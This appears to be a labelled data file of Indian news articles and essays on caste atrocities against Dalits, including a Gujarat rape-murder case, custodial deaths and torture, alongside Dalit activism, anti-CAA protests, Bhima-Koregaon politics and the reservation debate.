1, the family says they waited for two days for her to return. “When she didn’t, we went to the Modasa town police station on the early morning of January 3,” her distraught mother says. At the police station, the family claims, police inspector N.K. Rabari asked them to not worry and told the family that the victim had married someone within their caste. “He spoke to us as if he had definitive information about her whereabouts. He even told us that he would soon produce my daughter with her marriage certificate,” the father, a farm labourer shared. Rabari has since been suspended from work and the recently formed Special Investigations Team (SIT), led by deputy inspector general (DIG) Gautam Parmar is also probing Rabari’s probable link with the accused persons. The victim’s elder sister, a 21-year-old beautician, is key to the investigation. She had allegedly seen the victim being abducted from a village bus stop on January 1 around 1 pm. In her statement, she has named four men – Bimal Bharvad, Darshan Bharvad, Jigar and Satish Bharvad – of forcibly taking her away in a four-wheeler, now identified as a Hyundai i20, keeping her confined for four days, raping her and then hanging her from the tree. While the first three surrendered before the police, Satish Bharvad is absconding. All accused belong to the Rabari caste, a pastoral community classified as an Other Backward Classes (OBC) in Gujarat. Although the community is largely economically and socially backward, the victim’s relatives say Bimal Bharvad’s family, particularly, is landed and has political clout. From the start, the investigation did not inspire the family’s trust. The victim’s mother says, they had waited for four days for their daughter to return. The police failed to act and then on January 5, the body was finally found hanging. “Underneath the tree, a small temple of Kodialmata has been built. On January 5, when the priest went to pray, he looked up and found the body hanging. He raised an alarm and we were soon informed,” the mother says. “Only if the police had acted upon our complaint swiftly, our daughter could have been saved, perhaps,” she adds. The family used to live in a hut built on their small patch of land, but has since moved to a relative’s house in Sayara village. The Wire tried to find the priest who found the body for his version of the story. Most villagers claimed they did not know him and dissuaded this reporter from probing further. One person, however, said the priest belonged to the Panchal community and the land adjoining the Banyan tree belonged to the priest. Once the body was found hanging, the family and Dalit rights activists from several parts of Gujarat had gathered in the village and demanded the police arrest the accused immediately. The family refused to let the body be taken for autopsy until the FIR was registered. The FIR has several sections of the Indian Penal Code for abduction, gangrape, and murder. Sections of the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act have also been slapped on the accused. The Wire visited the spot where the body was found hanging. Although it was made to look like the young student took her own life, the body was knotted to a blue cloth at a height of around 20 feet, which is unlikely for a person of frail built to scale. The victim, according to the post mortem report, was only 152 centimetres tall and petite. The spot where the body was found hanging. Photo: Sukanya Shantha Discrepancies in the investigation Questions have been raised not just about the police’s refusal to act upon the complaint immediately but also in the way the investigations were carried out. For instance, the first interpretation of the post mortem report drawn soon after the body was recovered suggests there weren’t any injury marks on her genitalia. The report, however, suggested injuries were sustained to her neck. The report mentioned that “part of rectum is prolapsed out from anal canal”, but this crucial information was not taken into consideration. The second post mortem, provided by a panel of five forensic scientists, has indicated that the victim was sodomized repeatedly. The second report also points to four different injuries on the body of the victim. Besides the injury on her neck, the woman sustained “abraded contusions” to her forearm, abrasion on her upper chest towards the left side, and on her left arm. These abrasions, the report has suggested could have been sustained during a struggle or when being dragged on a hard surface. Until now, only the family had claimed that she was sexually assaulted. This report has substantiated the family’s claims. A senior police officer, however, has claimed that the forensic report received after the analysis of the victim’s body doesn’t show the presence of any “foreign particles”. “No saliva, hair or semen was found on her body. This, however, doesn’t mean that the victim was not sexually assaulted. They could have used precaution at the time of the assault.” He added that the forensic report on her clothes is awaited. Family members went to the home of one of the accused The statements given by the victim’s sister have also shifted substantially. Strangely, the family had not named the accused until the woman’s body was found on January 5. This, even when the victim’s sister says she saw the men drag the woman into a car, argue with her before zipping past her. According to the sister’s statement recorded in the FIR on January 5, soon after the victim was abducted, the family along with several men from the community, visited the spot where she was abduted. They retrieved CCTV footage from a nearby establishment, identified the car and its car number and then visited prime accused Bimal Bharvad’s house. Here, the sister claims, the family urged Bimal’s father Bharatbhai Bharvad to return their child back to them. A couple of days after, at the time of a protest meet arranged in the village, the victim’s sister in a video recording again repeated her statement as given to the police. Here, however, she mentioned that she was with the victim from 9 am to 1 pm. She is also seen identifying the men by their names and their respective villages. Also Read: Most Crimes Against Dalits Are Against SC Women: NCRB Data When The Wire and Shantaben Senma, a social worker from Gujarat-based Dalit rights organisation Navsarjan Trust, met the family on January 19, the family repeated their statement. However, they claimed that the men were unknown to them. They refused to name any of them and denied having met the family of one of the accused while looking for the victim. The victim’s sister has been unwell since the past week and the SIT, after several attempts, questioned her only on January 22. Modasa village in Gujarat. Photo: Google Maps “My child was my pride” Among seven siblings – six daughters and a son – the victim was the only one who had continued to pursue her education. The parents say despite the family’s difficulties, she had insisted on completing her studies. “We could not afford to educate them, so my other children had to drop out of school. She was studious, so we sent her to her aunt’s place in Isari at a very young age,” the mother shares. “My child was my pride,” the father adds. The family is only one of four that belong to the Chamar community, a Scheduled Caste, in the village. The village predominantly comprises of Patel, Thakor, Darbar, Rabari and Panchal houses. There are also a few dozen houses of the Vankar community, another Scheduled Caste. Social segregation is palpable in the village, with the Dalit basti built separately at a corner, away from the houses of the dominant castes. The victim’s family, like other Dalits in the village, survives on frugal means, depending on a very small patch of land. The victim was their hope for a better future. “They snatched our only hope from us,” the father says."
1,"From manual scavenging to upliftment of Dalit women, a look at some of the causes these activists are fighting for.  The fight for Dalit rights has taken a louder voice now more than ever before. We all know of Dr. Babasaheb Ambedkar as being the pioneer of the Dalit movement in India and there are people who have carried his legacy through. Thus, Dalits have found their place in society through politics and activism which has gone a long way in bringing the Dalit voice to the forefront. Assertion of Dalits for achieving equality has increased over the years. “Indifferentism is the worst kind of disease that can affect people,” said Babasaheb in one of his writings and this has been imbibed by Dalit leaders and activists who followed him and who are still continuing their work for upliftment of Dalits. Here’s a look at modern day Dalit leaders and activists who will continue to highlight Dalit issues and reform the community: Chandrashekhar Azad Born in Ghadkhauli village, Sahranpur, Uttar Pradesh, Chandrashekhar Azad is known to have come to prominence after he put up a board outside his village “The Great Chamars of Ghadkhauli Welcome you”.

He was arrested in 2017 for fanning protest by Dalit Community in Saharanpur and was released more than a year later. He was booked under the National Security Act. He was recently granted bail by a Delhi Court recognising his right to protest as a constitutional right as he was part of anti-CAA protest at Jama Masjid in Delhi. Even when the police were trying to arrest him, he had managed to give them a slip and had emerged in another protest. Jignesh Mevani Jignesh Mevani rose from being a grassroots activist to an elected Assembly member in Gujarat. His rise to popularity was when led the Dalit Asmita Yatra after a video of Dalit men being stripped down and being whipped in Gujarat’s Gir Somnath district went viral. He coined the slogan, “Gai ki loom aap rakho; hume humaari zameen do (You may keep the cow’s tail, give us our land)"".  He considers himself primarily to be an agitator who decided to enter politics to be able to raise issues from a non-compromising position. He has a deep interest in writings of Karl Marx and Babasaheb Ambedkar and the same is reflected in his oratory. His demand has been that every landless Dalit should get 5 acres of land, which according to him is rightfully theirs. He has earlier worked as a reporter and has a degree in law.  Dr. Ruth Manorama As per Dr. Ruth Manorama, who is a Dalit women’s rights activist, the condition of Dalit women is the worst as they suffer from triple alienation due to their caste, class and their gender. So Dalit women don’t just have to fight upper class oppressors but also men from their own community. For her work, Manorama has received the Right Livelihood Award in 2006 for “her commitment over decades to achieving equality for Dalit women, building effective and committed women’s organizations and working for their rights at national and international levels.”  (Image Courtesy: The Right Livelihood Award) She has been actively involved in educating, organizing and mobilizing women, Dalits, urban poor and the unorganized sector from the grass-root to the National levels. She is also the recipient of Dr. B.R. Ambedkar Award for doing work among women and Dalits in Karnataka.  Bezwada Wilson Wilson, himself a Dalit, has vehemently campaigned against the inhuman practice of manual scavenging. He has played a role in saving and helping rehabilitate 3 lakh manual scavengers. He comes from a Dalit family in Kolar who were involved in manual scavenging for generations. He is the national convenor of Safai Karmchari Andolan.

She has started a training centre for human rights litigation where lawyers, including women from disadvantaged communities, can be trained with professional skills and provided with a co-working space to act independently.

1,"The caste system is an ancient societal classification of people based on their varna (caste order or class) or jati (birth). An apartheid-like system, India’s caste order is the archetype of the closed system of social mobility and a structure rigged towards oppression regardless. This orthodox classification once determined a person’s occupation, marriage practices, and the privileges one enjoyed. In the varna system, extensively discussed in the Dharma Shastras, Dalits were positioned beneath the caste order itself, in a group that was casteless, ‘untouchable’ and alienated. Women who belonged to the four primary Hindu castes (Brahmins, Kshatriyas, Vaishyas, and Shudras) are called Savarnas (notice that it is spelled with an uppercase ‘S’ always to indicate superiority) while Dalits and scheduled tribes who did not belong to any caste are called avarnas. The word ‘Dalit’ literally means ‘broken’ or ‘scattered’ in Sanskrit. In the 1930s, the word meant ‘depressed class’ in Marathi and Hindi. The caste system was not always as oppressive as it has been after a few culturally sanctioned laws like from scriptures like the Manusmriti, Vishnu Smriti, and the Atharva Vedas post-2500 B.C. Indian jurist, economist, politician, and social reformer, Dr. B.R. Ambedkar in his article titled “The Rise and Fall of The Hindu Woman,” pointed out that the root cause of suffering in India was on account of religious scriptures that sanctioned this oppression. For instance, women at large had no right to education, independence, and wealth. This threw Dalit women unarmed and vulnerable against a rigorous patriarchal system. The Manusmriti regards the killing of Dalit women lightly, their lives were a perpetual cycle of humiliation and abuse. And like Dalit woman activist Moni Rani Das, puts it “If you are not considered human, human rights do not apply to you.” Systemic crimes In the case of Payal Tadvi, discrimination was very subtle and sophisticated. As a student of medicine, she reported that the professors would not assign her cases to practice her profession, she was not allowed inside the operation theatre and was given a lot of menial jobs to do until the day she decided she had had enough. It was Tuesday the 28th of May last year when she took her life. The incident has whipped up considerable debate and the suicide has been regarded as a ‘State-sponsored crime.’ Institutional casteism begins as soon as the student steps into the school or college through a reservation method. Dalit girls in schools are made to sweep and clean classrooms and corridors and in some anonymous reports, even clean septic tanks. According to the National Commission for Scheduled Caste and Scheduled Tribes 2000, about 75% of Dalit girls drop out of primary school despite laws that hold ‘progressive reservations’ for Dalit children. Their academic aptitude is usually despised and one of the reasons for their early drop out is an escape from bullying, humiliation, and isolation by classmates, society, teachers, and management. Low literacy is also on account of the lack of educational resources, privatization of schools and colleges, severe poverty, and the demand for an increased dowry for educated girls. Violence More explicit violence has also been the order of the day. Violence is used as a powerful political tool for oppression and the assertion of power. Ruth Manorama, an active member of the National Campaign on Dalit Human Rights and the National Alliance of Women, once stated that in a male-dominated society, “Dalit women face a triple burden of caste, class, and gender.” Bindu, a 27-year-old Dalit girl from small-town India had refused to take an offer from the son of the town leader. It was 50 rupees (less than $ 1) in return for sex. Her house was set on fire and the family’s belongings were thrown down the local river. Another 19-year-old named Chanchal was asleep when four men from a dominant caste attacked her and poured acid on her face. Her crime: she was trying to pursue an education. Her face remains severely marred and she reported, “neither the police nor the government seems serious in pushing my case.” A large number of crimes against Dalit women in modern India go unreported because they are not ‘important enough’. “[Dalits] are often victims of civil, political, economic, social and cultural rights violations, including sexual abuse and violence. They are often displaced; pushed into forced and/or bonded labour, prostitution, and trafficking,” wrote Rashida Manjoo, a UN Special Rapporteur on Violence against Women. When some of them have dared to protest, they are further isolated and threatened of rape, or arson or an acid attack. The women succumb to defending their fragile honour. Bonded Labour Anti-slavery International reports that about 80% of bonded labourers in India are from untouchable or indigenous backgrounds. And the Global Slavery Index shows that India alone accounts for half of the world’s modern slaves today. The index further cites caste and tribe systems as primary factors that influence the prevalence of modern slavery, zeroing in on Dalit women and children as most vulnerable here. The bigotry in the minds of the dominant caste is both ignorant and deliberate. They assume they can do whatever they please. They feel licensed to go to Dalit houses, rooms, or beds without the fear of law enforcement or a criminal justice system. When the girls or their families consider complaining to the authorities, they get humiliated to the point of despair; just to be ‘taught a lesson.’ In most cases, Dalit girls feel profoundly isolated as sexual assault survivors. Blaming victims of sexual violence for their own assault is part of a deeply entrenched pattern in our society. “Why didn’t you scream or fight back?” or worse, “You seem to have enjoyed it in silence,” are things they hear when they find the courage to come out. Just as Nigerian writer, Ijeoma Umebinyou puts it: “You see in a culture like ours, we were never taught the importance of healing. We were only taught to survive. Not heal, but bury and survive.” In India as well, the problem breeds more problems, and violence against avarnas is incestuous. How do we fix this? “They threaten us with rape, jail, even murder. Still, we refuse to be silenced. We found the courage to fight for our rights – surely the world must find the courage to support us,” Dalit woman human rights defender. Women who apparently escape and find themselves a career and future abroad seem to be better off. In the opening chapter of her book Ants Among Elephants, Dalit writer Gidla writes that years ago at a bar in Atlanta, she told a guy she was an untouchable and he said, “Oh, but you’re so touchable.” It is “a very innocent and strange thing to encounter,” she later says in an interview, “But come to India and the encounters plus questions posed to the English-speaking Dalit woman get weirder.” At home, Dalit women rarely have the latitude to prove merit or exercise creativity and independent judgment. In the case of Gilda at the Jaipur Literature Festival, which is a space of intellectual synergy, she says, “They didn’t give a shit about me even though I wrote a great book.” Fixing systemic problems like bigotry and violence that are deeply imbued in courts of justice, education systems, healthcare, and other public spaces cannot be accomplished through a single revolution, however organized it is. Professor Vimal Thorat, the Convenor of the National Campaign on Dalit Human Rights said, “In our experience of monitoring violence against Dalit women, the ineffectiveness of criminal justice system compounded by wilful negligence by the police to investigate the cases within the prescribed legal framework is evident.” Identity politics: The good, the bad, and the struggling Changing the broken casteist and patriarchal system cannot happen merely by the way we talk about women and sex. It doesn’t just start with sexist or casteist beliefs at home. The struggle is larger than personal tragedies, it is a political validation of trauma and oppression. Dalit women have been actively involved in anti-caste and anti-untouchability movements since the 1920s. The self-respect movement, taking from Periyar’s principles has been effective but unable to put an end to the structural exclusion. Identity politics in this case scenario has helped Dalits re-forge their identity, fight for rights, bring positive changes like taking legal action against caste-based atrocities, political and economic empowerment of Dalit women. While it holds on to the title of being avarna or Dalit, it does so with a subaltern narrative and leverages facts against a system that is steeped with patriarchal and casteist beliefs. The National Federation for Dalit Women was launched by Dalit women and is committed to making a progressive change in a so-called ‘post-caste era.’ But what lies at stake is their livelihood and survival on a daily basis, therefore, making it impossible for them to organise themselves formally.

1,"Shivamogga: The Karnataka Dalit Sangharsha Samiti (Ambedkar) staged a protest against CAA, NRC and NPR near the DC’s office in Shivamogga on Friday, January 24. The organisation also submitted a memorandum to the President of India through DC, urging the government to repeal the unconstitutional laws. “Apart from destroying democracy, the Citizenship Amendment Act is also against humanity and endangers the constitution. That is why humanitarians have come forward to oppose the act,” said the protesters. Elaborating on why they do not want the three to be implemented, the protesters said “Our grandparents have been living in India for hundreds of years which is how we have obtained a passport, Aadhaar card, and other documents. This already shows that we are official citizens and there is no authority that can question our citizenship. All these documents will be collected and the NRC will be carried out in the area and the first NRC exercise will be announced. That is why the NRC and NPR have no link at all.”   How useful was this post? Click on a star to rate it!  Average rating 0 / 5. Vote count: 0 No votes so far! Be the first to rate this post.

1,"While the tussle between the Bharatiya Janata Party (BJP)-led Centre and the Maharashtra Vikas Aghadi (MVA) government over the probe into the 2018 Bhima-Koregaon violence is over the narrative of “urban naxals”, for the Nationalist Congress Party (NCP), it is also a bid to consolidate Dalit votes. Among the MVA allies, the Nationalist Congress Party (NCP) has taken the lead to contest the BJP’s “urban naxal” narrative, with party chief Sharad Pawar pushing for a review of the investigation carried out under the erstwhile BJP government’s tenure and questioning the branding of arrested activists as “urban naxals”. The Congress, too, has supported this stand openly. However, the Shiv Sena has avoided making any statements on the issue so far. While Pawar has been consistent about his opinion over the Bhima-Koregaon probe, there is also a clear political angle to this stand: It is a bid to reach out to the Dalit community that has been patently unhappy with the BJP. The majority of the community, which makes up 13% of the state’s population, is currently split between the Congress-NCP combine and Dalit leader Prakash Ambedkar’s Vanchit Bahujan Aghadi (VBA), even as BJP ally, Republican Party of India’s Ramdas Athawale continues to enjoy some support base among Dalits in urban areas. Ambedkar’s outfit, which was formed after the Bhima-Koregaon violence, damaged the Congress-NCP alliance’s prospects in both the Lok Sabha as well as the Vidhan Sabha polls. If not for VBA, the BJP might not have touched 100-seat mark in the state Assembly polls. With the National Investigation Agency (NIA) now taking over the probe into the Bhima-Koregaon violence, the MVA government’s stand against the Centre is likely to win it support from Dalits in the state. And, the BJP, which is aware of this, is digging its heels to show that the investigations carried out under its government were on the dot as they uncovered a Maoist conspiracy that has repercussions for the country. “This government, especially the NCP, is clearly reaching out to the Dalits with its explicit stand against the ‘urban naxal’ narrative. The party is looking at expansion in Vidarbha, where such a stand will help it expand its base. It will also help the NCP earn lost foothold in cities like Mumbai. The NCP leaders’ statements point to a well-coordinated strategy to corner the BJP on this issue and shore support of Dalits,’’ said political analyst Hemant Desai. Pawar, as well as state home minister Anil Deshmukh, have questioned the haste with which NIA took over the Bhima-Koregaon inquiry. “Why the haste just when the state was looking at setting up an SIT? It’s because of the fear of being exposed. They are afraid the truth will come out,’’ said Pawar, while speaking to reporters in Mumbai on Saturday. The violence on January 1, 2018, occurred when Dalits had gathered near the war memorial to celebrate the 200th anniversary of the Bhima-Koregaon battle, in which the British army, led by the Mahar regiment, won against the ruling Peshwas. The violence had sparked Dalit protests and a bandh across the state. The police investigations under the Fadnavis regime, had pointed to a Maoist conspiracy and led to the arrest of several activists with purported Maoist links. It had also led to alienation of the Dalit community as no action was taken against Hindu hardline leaders like Sambhaji Bhide and Milind Ekbote, who, Dalit leaders had alleged, were responsible for the violence. Former chief minister Devendra Fadnavis, meanwhile, backed the NIA probe and said the MVA government was indulging in politics of votes. “Maharashtra Police had investigated this case in great detail to uncover the network of ‘urban naxals’. Charge sheets have been framed. Despite this, the government, in a bid to play politics of votes, questioned this probe,’’ he said. “I think the decision to give it to the NIA is correct. The Maharashtra investigations had shown that the ‘urban naxal network’ is spread across India.” ‘MAHA MAY CONDUCT OWN PROBE’ State energy minister Nitin Raut said the state may not cooperate with the Centre, and may conduct its own probe. “We will take a call in the next cabinet meeting. We may not cooperate with NIA and launch a probe by the Maha SIT,” he said, adding BJP has a “grudge” against those who organised Elgar Parishad. “How can anyone call retired justices BG Kolse-Patil and PB Sawant, who were the main organisers urban naxals? If you criticise the govt, you become naxals for them [BJP]. They are taking country towards autocracy,” he added. Get our daily newsletter Get free access to newsletters, alerts and recommendations"
1,"The BJP on Tuesday protested over the death of a Dalit man in Madhya Pradesh's Sagar district and alleged the Kamal Nath government in the state was adopting a policy of minority appeasement. Dhanprasad Ahirwar (24) was doused with kerosene in Dharmshri Colony, some 170 kilometres from here, on January 14 allegedly by four people who wanted him to take back a police complaint. All four, identified as Chhuttu, Ajju Pathan, Kallu and Irfan, were arrested. Ahirwar, who sustained 70 percent burns, was initially treated in Sagar, then shifted to a hospital in Bhopal, and later air-lifted to a facility in New Delhi where he succumbed on January 23. Addressing a protest rally here, former chief minister and senior BJP leader Shivarj Singh Chouhan said a mob of 20- 25 people had set Ahirwar on fire. ""These persons also wanted to kill Ahirwar in 2019 but police did not take action. It was the government's duty to arrest the accused but it did not touch them because they belong to a minority community. The voice of a poor Dalit was not heard,"" Chouhan alleged. He said crimes against Dalits were rising in MP under the Kamal Nath dispensation and the party's high command, comprising Sonia Gandhi, Rahul Gandhi and Priyanka Gandhi would have to answer. He asked if the Gandhi family would come to Sagar to meet the kin of the deceased. State BJP chief Rakesh Singh said Ahirwar had approached police three times claiming that his life was in danger but the police did nothing. He said the state government should give Rs 25 lakh as compensation to Ahirwar's family as well as a job..

1,"The world around Chandrashekhar Azad Ravan appears to be spinning very fast, like he is at the centre of a vortex. Pressure is growing from his supporters to turn the Bhim Army into a political party. According to many in his inner circle, he could launch a new national party as early as in March 2020. But given that his inner circle is very large, it is difficult to separate legend and nail facts. For instance, he has a blood condition which requires him to undergo Phlebotomy every fortnight. The process involves drawing blood out of his system to prevent it from thickening and causing a heart attack. The legend, however, is simply that ‘Ravan produces too much blood when he is angry’. The talk around him is that political offers have been streaming in from across the country ever since Ravan plunged into the anti-CAA protests. Dalit leaders from different political parties are said to be queuing up to offer support. Login Please subscribe on thefederal.com/plans/"
1,"This fight will go on because such an insensitive government & politicians have never been there in our country. Author and activist Manoranjan Byapari minces no words when talking to The Quint about the ongoing anti-CAA protests across the country. Unlike many political leaders, who seem to have taken a comfortable stand on the amended citizenship act, Byapari refuses to be taken in by the assurances given by the BJP government. He shares how the protests are not going anywhere soon and how the the government may resort to violence to subdue them. Below is an excerpt from the conversation:  On Ongoing Anti CAA-NRC Protests  People are expressing dissent against CAA-NRC in Kolkata. Everyday a procession is being taken out. Students, youngsters and mostly women; particularly women from the Muslim community who have never stepped out of their houses, even they have started coming out of their houses now and are taking part in the protest. It is very clear that the government will not bow down to these protests. They will have to employ the use of machine guns and air bombs, before which this stops. This fight has just taken off. This fight will go on in the future too. This is because such an insensitive government and politicians have never been in our country before. They don’t know the value of the lives of people. They will stretch themselves to the extreme, from where they will either lose or win. If they win, then it will be a deadly day, not just for Indians but for humans as a race. If humans (protesters) are able to win then it will pave the way for a new society.  On BJP Government’s Assurances With Respect to CAA-NRC  You transformed into a snake and bit us and now you say that you will provide us with first-aid for the same. Why did you bring forth this bill in the year 2003? This bill was brought in by you. Before this people had Voter Card, Aadhar Card, Pan Card and some even had passports. It was through their votes that you came to power. Today you are standing against it saying that all these documents hold no value and you will create new papers and give them to people which will prove whether one is a citizen. So, somewhere or the other it shows that you have something else going on in your mind. A lot like the saying that elephant’s tooth is different to see and entirely different to chew. Bangladesh will not accept us and you say that we don’t belong here. So, you think we have been dropped from the skies here? Where has our country gone? You tell us where to stay, then. You are creating detention camps for us and telling us that we have to stay there. We will not accept this. So many people have come on the streets and they don’t want to go to detention camps.  On Mamata Banerjee  Look, up until now her stand has been appreciation worthy. But she is the Chief Minister and we never know as to when she changes her stance to what and where, no one can tell. The common man has waged a war with the government. The common man has taken to the streets. As you are already seeing the poor vote percent that CPM gets. But when they take out the procession, lakhs of people take part in it. These people who take part in the procession are not from CPM, they are the ones who are against this law. They are standing up and fighting the war. Any party which disassociates themselves from these processions will lose the support of the common man.  On Mayawati and Chandrashekhar  Now that Mayawati’s name has come into the picture—she was elected as the Chief Minister by the Dalits. Then why have the Dalits turned against her? This means that you have not been able to fall through to her expectations and that is why people have lost their trust in you. Now, Mayawati is not even outrightly rejecting this Law because CBI is after her. She is scared that if she stands against them then she will be sent to the gallows. So, she is not able to speak as openly as Chandrashekhar Azad aka Ravan is able to. He is not scared of speaking. Mayawati is scared of speaking as she saw how things panned out for Lalu Prasad Yadav. Somewhere or the other these people have done something or the other which is causing them to be scared of CBI and SIT. That is why these people have not been able to openly protest against it. They also feel the need to ask as to how long must they protest? As long as they get permission enough to roast their political bread, they protest. Just stating that she is a messiah and a revered minister of the Dalit community is wrong. If you look closely, you will find out that more than half of the leadership actually belongs to the upper castes. Therefore, it is no longer a question of what she is doing. It is a question of what the people are doing. (At The Quint, we are answerable only to our audience. Play an active role in shaping our journalism by becoming a member.

1,"Scrap shop owner Jitender Khatik was detained by police on Wednesday, who accused him of being in possession of stolen property. He was dead a day later. Jitender Khatik. Photo: By arrangment Jaipur: In what seems to be yet another case of custodial death, a day after a Dalit man in Rajasthan’s Barmer was picked up by the police, who accused him of having stolen property in his possession, he was reported dead on Thursday. The family of the deceased has accused the police of murder. Jitender Khatik alias Jitu, a 26-year-old man who owns a scrap shop was detained by the Barmer (rural) police on Wednesday, who alleged that a “pipe” in his possession was stolen property. Khatik’s brother Champalal told The Wire that the family had shown the police a receipt for the pipe to prove that it wasn’t stolen. “But still they took my brother away. The policemen asked me to bring the bill to the station in the evening and that they would then set my brother free,” he said. When Khatik’s family went to the station in the evening along with the bill, the police told them he would be released the next morning. “In the night, we took food for him. In the morning too, at around 9 am, we took tea for him and met him. He didn’t say much but his eyes were swelling and he looked very tired. The police only let us speak to him for a short time,” added Champalal. Three hours later, when Khatik’s family was waiting outside the station for his release, the police called them to inform that he had died. Also Read: We Must Recognise That Discrimination Plays a Large Role in Custodial Torture “He was in a different room and his mouth was wide open. Even when we pressed down hard in the middle of his chest, he didn’t move. The doctors confirmed that he is dead,” Champalal said. Khatik was the eldest among his five brothers and sisters. He is survived by a wife and a five-year-old son. The family has demanded the arrest of the policemen responsible for the death, apart from seeking a government job to one of the members of the family and a compensation of Rs 1 crore. They have also said that his body wouldn’t be cremated until their demands are fulfilled. “If the government will not fulfill our demands before 6 pm on Friday, we will take the dead body on roads in protest,” his brother said. A case under murder charges has been registered against Deep Singh, the station house officer of the Barmer (rural) police station and other policemen. Barmer superintendent of police Sharad Chowdhary told the Indian Express that the judicial magistrate will conduct the post-mortem of the body on Friday. “The SHO has been suspended and the entire police station staff has been sent to the lines as per NHRC guidelines. A case under section 302 (murder) of the IPC has been registered against SHO Singh and other police personnel,” he said. The SP also said that though the police had received information that Khatik was in possession of stolen goods, based on which he was brought to the police station for questioning, no FIR was registered against him. Meanwhile, the opposition parties in the state have accused the Ashok Gehlot-led Congress government of unleashing atrocities against the Dalits through the police. क्या @ashokgehlot51 जी आपकी पुलिस दलितों पर अत्याचार कब बंद करेगी,अंग्रेजी सरकार के नक्शे कदम पर चलकर आप पूज्य महात्मा गांधी जी के आदर्शों पर चलने का ढोंग कब तक करते रहोगे ?@RLPINDIAorg #दलित_विरोधी_गहलोत_सरकार pic.twitter.com/YeRcng47E2 — HANUMAN BENIWAL (@hanumanbeniwal) February 28, 2020  The opposition had also made the same accusation last week, when disturbing videos of two Dalit men being tortured by civilians emerged."
1,"A view of the Supreme Court building. Bhopal/Mandsaur: A Dalit law student has appealed to the Supreme Court for legislation to stop family members of lawmakers and bureaucrats from getting the benefits of reservation. The development comes against the backdrop of a swirling debate on the quota system in the country, particularly after the SC ruled this month that there is no fundamental right to reservations in appointments and promotions under articles 16(4) and 16(4A) of the Constitution. The petitioner, 25-year-old Vikram Kumar Bagde, a native of Madhya Pradesh’s Neemuch town, is also of the view that just like people can voluntarily give up cooking gas and rail travel subsidy, the resourceful section of the reserved categories should have the option to forgo the benefits to ensure the 80% deprived community members can take much-needed advantage. Bagde, whose father is a peon, says he never availed caste reservation after clearing class XII, made it through the law entrance examination as a general category candidate, and is currently a first-year LLB student in Rajiv Gandhi College, Mandsaur. “I had filed the PIL with the Supreme Court on January 25 and it was admitted on February 2,” said Bagde, adding that the date of hearing is yet to be finalised by the court. Explaining the reasons behind filing the public interest litigation, he said that children from affluent families are more likely to get selected in any entrance test or recruitment process owing to their well-funded preparations rather than someone from a less-privileged background. On this basis, he has urged the apex court to stop the kin of lawmakers and grade 1 government officers from availing the perks of reservation. Citing his interactions with several politicians in Madhya Pradesh, Bagde said eligible legislators could continue to take advantage of reservation provisions in elections but their family members should be prevented from doing it in education and jobs. The law student, who says he sees a dire need of reservation for the Scheduled Castes and Scheduled Tribes but doesn’t have much knowledge of quota provisions in his region, even tried surrendering his caste certificate but was purportedly told by several MPs and MLAs that no such clause exists. “I have in my PIL urged the SC to ensure legislation to enable those who wish to shun reservation benefits on the lines of LPG subsidy and rail travel concessions,” said Bagde. He also argued that the race to grab reservation benefits is assuming dangerous proportions, triggering social tensions and divisions. “Influential people from within the reserved categories should lead by example,” Bagde said, maintaining that this would inspire others to give up quota benefits."

Fifteen Madhya Pradesh forest officials were booked for murder on Sunday, 16 February, after allegedly opening fire and killing a Dalit man following a dispute in Shivpuri district, police said. ""Complainant Saroj Balmiki said the dispute began when her two daughters were filling water from the handpump. Forest Ranger SK Sharma arrived to fill his water bottle. Some water splashed on him after which he abused the women there,"" Karera police station in charge Rakesh Sharma said. ""Balmiki said a woman forest officer arrived at the scene and started hitting her daughters. One of the girls rushed home and called her father Madan. He and his brother Pankaj arrived and were hit by the butts of guns by the forest staff. When Madan and his brother tried to flee, the forest staff shot at them,"" he added. ""We have booked Sharma, the woman officer and 13 staff for murder under sections of IPC and SC/ST (Prevention of Atrocities) Act. They have absconded and efforts are on to nab them,"" he said.

Police on Thursday arrested seven accused in the case. As Chief Minister Ashok Gehlot started reading the budget speech in the House, three Rashtriya Lok Tantrik Party MLAs sat on the stairs of the entry gate protesting against the torture of Dalit youths over a minor theft case on Wednesday. Earlier, Speaker CP Joshi denied permission to show placards in the House. Additional DGP (Civil Rights) Ravi Prakash said as per the preliminary report, two youths Visaram and Pannaram were allegedly tied up and beaten up by some persons of Auto Mobbile Bike agency at Karnu village in Nagaur district on February 16. A video that has gone viral on social media on February 19 showed the youths being beaten up and petrol poured into their private parts, the ADGP said in a statement here. The two were allegedly accused of stealing cash from the counter. Visaram was later admitted to a hospital. A case under various sections of the IPC and SC/ST Act was registered against the accused. The case is to be probed by investigation officer Mukul Sharma. A counter-FIR was also lodged. On the viral video, Congress leader Rahul Gandhi tweeted, “Dalit men being brutally tortured in Nagaur, Rajasthan is horrific and sickening. I urge the state government to take immediate action to bring the perpetrators of this shocking crime to justice.” Boycotting the budget speech, three RLTP members Indira Devi Bawari, Pukhraj Garg and Narayan Beniwal held a protest on the stairs demanding removal of Nagaur SP. Earlier, the three MLAs wanted to walk up to the Well but the Speaker stopped them from doing so after which they walked out. Meanwhile, taking a cognizance of Rahul Gandhi's concern, PCC president Sachin Pilot set up a committee to probe the case and visit the incident place on February 21.

Post this, a storm was raised in the Parliament by the Opposition parties demanding that a review petition be filed against the decision or that the Constitution be amended to make reservation a fundamental right. The Congress, Lok Janshakti Party (LJP) and Janata Dal United (JDU) contended that the SC order was anti-Dalit. The issue turned into a political slugfest with the Opposition and the NDA blaming each other. The Tribune reported that outside the Parliament Rahul Gandhi targeted the State’s counsels who argued that reservation wasn’t a fundamental right and said, “The RSS and the BJP cannot stand the idea that Dalits, tribals and OBCs have reservation. They have attempted to remove reservation. They demolished the Ravidas temple here. You saw what they did to the SC-ST sub-plan. Now they are arguing that reservation is not a fundamental right. It is in their DNA to try and erase reservations but no matter what their fantasies, we won’t let it happen.” As the Opposition staged a walkout, Thawar Chand Gehlot, a member of the BJP and Social Justice Minister said, “This is a very important issue. We are conducting a high-level review. The Government of India was neither made a party to this case nor was its affidavit sought. The SC order emanates from a September 5, 2012, decision of the then Congress-led government of Uttarakhand to not grant reservation in promotions to SCs and STs.” In July 2012, the Uttarakhand High Court, while hearing the case of Vinod Prakash Nautiyal vs the State of Uttarakhand, barred reservations in promotions and in September 2012, the Uttarakhand state government issued an order barring departments from giving reservations in promotions to SC / ST employees. In April 2019, the Uttarakhand HC quashed the state government’s order and in September 2019, the state government put all promotions on hold in the state government departments. Two months later, the Uttarakhand HC put aside the order quashing the state government’s directions. It then directed the Uttarakhand government to collect data on “adequacy/inadequacy in the representation of 